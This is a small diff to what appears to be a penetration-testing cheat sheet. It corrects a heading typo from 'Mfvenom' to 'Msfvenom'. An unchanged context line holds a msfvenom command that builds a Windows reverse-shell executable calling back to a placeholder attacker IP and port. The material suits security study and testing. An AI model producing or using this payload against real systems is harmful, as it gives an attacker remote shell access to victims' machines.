@@ -39,7 +39,7 @@ nmap --script-help=clamav-exec.nse
 ```
 
 
-## Mfvenom
+## Msfvenom
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > reverse.exe
 ```
